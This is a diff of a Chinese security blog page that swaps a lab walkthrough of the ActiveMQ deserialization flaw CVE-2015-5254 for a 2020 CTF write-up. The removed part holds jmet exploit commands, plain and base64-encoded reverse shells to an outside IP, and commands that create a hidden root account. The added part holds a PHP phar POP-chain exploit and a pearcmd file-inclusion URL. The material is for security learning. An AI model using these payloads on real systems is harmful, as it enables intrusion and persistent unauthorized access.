@@ -9,7 +9,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    CVE-2015-5254 |  
+    巅峰极客2020 |  
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -56,7 +56,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-CVE-2015-5254"
+  id="post-巅峰极客2020"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -67,18 +67,18 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  CVE-2015-5254
+  巅峰极客2020
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2020/09/22/CVE-2015-5254/" class="article-date">
-  <time datetime="2020-09-22T13:40:51.000Z" itemprop="datePublished">2020-09-22</time>
+      <a href="/2020/09/28/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020/" class="article-date">
+  <time datetime="2020-09-28T07:54:28.000Z" itemprop="datePublished">2020-09-28</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/CTF/">CTF</a> / <a class="article-category-link" href="/categories/CTF/CVE/">CVE</a>
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
   </div>
   
 <div class="word_count">
@@ -86,7 +86,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">731</span>
+            <span class="post-count">628</span>
         </span>
     </span>
 
@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">3 min</span>
+            <span class="post-count">2 min</span>
         </span>
     </span>
 </div>
@@ -110,46 +110,36 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="lt-ActiveMQ-反序列化漏洞-gt-待完全理解"><a href="#lt-ActiveMQ-反序列化漏洞-gt-待完全理解" class="headerlink" title="&lt;ActiveMQ 反序列化漏洞&gt;(待完全理解)"></a>&lt;ActiveMQ 反序列化漏洞&gt;(待完全理解)</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>
-<!--morer-->
+  <h1 id="2020巅峰极客部分WP"><a href="#2020巅峰极客部分WP" class="headerlink" title="2020巅峰极客部分WP"></a>2020巅峰极客部分WP</h1><p>参考链接:<a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2634.html">https://www.gem-love.com/ctf/2634.html</a></p>
+<p>主要不是题目的解答，看了颖奇大佬的文章，再根据自己在做题目的过程中记忆，对题目单纯的进行理论上的复现，原理是一样的</p>
+<h2 id="BabyPhp2"><a href="#BabyPhp2" class="headerlink" title="BabyPhp2"></a>BabyPhp2</h2><p>打开题目</p>
+<p><img src="https://i.loli.net/2020/09/28/V6MiunxmdfpzkEC.png"></p>
+<p>这里提示已经很明显了，这里登陆不上的。</p>
+<p>然后扫目录，得到<a target="_blank" rel="noopener" href="http://www.zip,源码泄漏,然后打开源码,进行源码的分析/">www.zip，源码泄漏，然后打开源码，进行源码的分析</a></p>
+<p><img src="https://i.loli.net/2020/09/28/zUTKC5ySladEGtF.png"></p>
+<p>文件读取的漏洞，但是这个读取方法里面的有waf，魔术方法就需要制造调用，构建POP链。现在就是要找到这个链头了。</p>
+<p><img src="https://i.loli.net/2020/09/28/Xar8jLGyDCcxM2e.png"></p>
+<p>有一个魔术方法之中有修改的内容，可以这里是可以利用，接下来就是想办法将 这个地方包含进来还要执行这条链。剩下的就是<code>file_get_contents</code>这个函数了。利用伪协议将php文件读取进来，还要能够执行。<code>phar</code>伪协议满足要求。但是</p>
+<p><img src="https://i.loli.net/2020/09/28/QN7ylUWLEfZrwCu.png"></p>
+<p>已经被销毁了。这里提醒一下，伪协议是可以联合使用的。</p>
+<p><code>compress.zlib://phar://</code></p>
+<p>这样就可以绕过限制读取文件，再加上那个upload.php上传的时候改一个名字，问题也就解决了。下面贴上大佬的脚本。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age&#x3D;null;</span><br><span class="line">    public $nickname&#x3D;null;</span><br><span class="line">    public $backup;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname &#x3D; new Reader();</span><br><span class="line">        $this-&gt;backup &#x3D; &quot;&#x2F;flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $token;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;token &#x3D; new User;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Reader&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$y1ng &#x3D; new dbCtrl();</span><br><span class="line"></span><br><span class="line">$phar &#x3D; new Phar(&quot;web1.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($y1ng);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">@rename(&quot;web1.phar&quot;, &quot;y1ng.gif&quot;);</span><br></pre></td></tr></table></figure>
 
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞利用过程如下：</p>
-<ol>
-<li>构造（可以使用ysoserial）可执行命令的序列化对象</li>
-<li>作为一个消息，发送给目标61616端口</li>
-<li>访问web管理页面，读取消息，触发漏洞</li>
-</ol>
-<p>使用<a target="_blank" rel="noopener" href="https://github.com/matthiaskaiser/jmet">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p>
-<p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</p>
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></figure>
+<p>之后将gif上传即可</p>
+<p><img src="https://i.loli.net/2020/09/28/2pFyVEOhMnDPSwd.png"></p>
+<p>这里利用是否有序列化的数据出现判断是否协议生效，这样就可以调节文件路径到底是怎样的。</p>
+<p>phar反序列参考链接：<a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>
+<h1 id="MeowWorld"><a href="#MeowWorld" class="headerlink" title="MeowWorld"></a>MeowWorld</h1><p>这道题有个Hint：<code>register_argc_argv</code></p>
+<p>然后这个题很容易看出漏洞是本地文件包含，并且限制了包含的目录，就别想逃出来了。</p>
+<p>然后就是利用pear这个包管理器，下载我们自己的马儿，然后，包含，来命令执行。</p>
+<p><img src="https://i.loli.net/2020/09/28/yDpaCFUfLvwQm2E.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.php?f&#x3D;&#x2F;usr&#x2F;share&#x2F;pear&#x2F;pearcmd&amp;+list</span><br></pre></td></tr></table></figure>
 
-<p>然后登陆页面</p>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=event">http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=event</a></p>
-<p>点击消息，触发漏洞</p>
-<p>然后进入docker</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it   9a540c50a8dc  &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+<p>这个就相当于在本地运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear list</span><br></pre></td></tr></table></figure>
 
-<p>如果在/tmp目录下存在success文件则显示成功</p>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;12340&gt;&amp;1&quot; -Yp ROME 127.0.0.1   61616</span><br></pre></td></tr></table></figure>
-
-<p>外面用nc监听1234端口</p>
-<p>注意把攻击的命令进行base64编码，绕过java本身的限制</p>
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjE5Mi83Nzc3IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 192.168.43.192 61616</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -g root -s &#x2F;bin&#x2F;bash -u 10010 test</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;s&#x2F;test:x:10010&#x2F;test:x:0&#x2F;g&quot; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test:sd123456&quot; | chpasswd</span><br></pre></td></tr></table></figure>
-
-<p>到这里就可以完全创建一个具有root权限的用户，稍后进行远程登陆就可以了。</p>
-<h2 id="jmet的使用"><a href="#jmet的使用" class="headerlink" title="jmet的使用"></a>jmet的使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar target&#x2F;jmet-0.1.0-all.jar</span><br><span class="line">ERROR d.c.j.JMET [main] Misconfiguration: Missing required options: [-C Custom script exploitation mode, -Y Deser exploitation mode, -X XXE exploitation mode], [-T topic name, -Q queue name], I</span><br><span class="line">usage: jmet [host] [port]</span><br><span class="line"> -C,--Custom &lt;scriptname&gt;         Custom script exploitation mode</span><br><span class="line"> -f,--filter &lt;scriptname&gt;         filter script</span><br><span class="line"> -I,--impl &lt;arg&gt;                  ActiveMQ| Artemis| WebSphereMQ| Qpid10|</span><br><span class="line">                                  Qpid09| HornetQ| SwiftMQ| RabbitMQ|</span><br><span class="line">                                  OpenMQ</span><br><span class="line"> -pw,--password &lt;pass&gt;            password for authentication</span><br><span class="line"> -Q,--Queue &lt;name&gt;                queue name</span><br><span class="line"> -s,--substitute                  Substituation mode: Use §§ to pass</span><br><span class="line">                                  ysoserial payload name to CMD</span><br><span class="line"> -T,--Topic &lt;name&gt;                topic name</span><br><span class="line"> -u,--user &lt;id&gt;                   user for authentication</span><br><span class="line"> -v,--verbose                     Running verbose mode</span><br><span class="line"> -X,--XXE &lt;URL&gt;                   XXE exploitation mode</span><br><span class="line"> -Xp,--xxepayload &lt;payloadname&gt;   Optional: XXE Payload to use EXTERNAL|</span><br><span class="line">                                  PARAMATER| DTD</span><br><span class="line"> -Y,--ysoserial &lt;CMD&gt;             Deser exploitation mode</span><br><span class="line"> -Yp,--payload &lt;payloadname&gt;      Optional: Ysoserial Payload to use</span><br><span class="line">                                  BeanShell1| CommonsBeanutils1|</span><br><span class="line">                                  CommonsCollections1|</span><br><span class="line">                                  CommonsCollections2|</span><br><span class="line">                                  CommonsCollections3|</span><br><span class="line">                                  CommonsCollections4|</span><br><span class="line">                                  CommonsCollections5| Groovy1|</span><br><span class="line">                                  Hibernate1| Hibernate2| Jdk7u21| JSON1|</span><br><span class="line">                                  ROME| Spring1| Spring2</span><br><span class="line"> -Zc,--channel &lt;channel&gt;          channel name (only WebSphereMQ)</span><br><span class="line"> -Zq,--queuemanager &lt;name&gt;        queue manager name (only WebSphereMQ)</span><br><span class="line"> -Zv,--vhost &lt;name&gt;               vhost name (only AMQP-Brokers:</span><br><span class="line">                                  RabbitMQ|QPid09|QPid10)</span><br></pre></td></tr></table></figure>
-
-<p>其中的深层次的原理等待java+web学完之后回来补</p>
+<p>这样也就不难猜到提示词的用意了。</p>
  
       <!-- reward -->
       
@@ -212,12 +202,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2020/09/22/CVE-2015-5254/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2020/09/28/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE%EF%BC%8C%E6%9C%AA%E5%AE%8C%E5%85%A8%E8%A7%A3%E5%86%B3/" rel="tag">CVE，未完全解决</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
 
     </footer>
   </div>
@@ -225,19 +215,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2020/09/23/ThinkPhp-5/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            ThinkPhp-5
-          
-        </div>
-      </a>
     
-    
-      <a href="/2020/09/21/ThinkPhp-4/" class="article-nav-link">
+      <a href="/2020/09/25/%E9%9A%8F%E7%AC%94%E5%B0%8F%E8%AE%B0/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">ThinkPhp-4</div>
+        <div class="article-nav-title">随笔小记</div>
       </a>
     
   </nav>
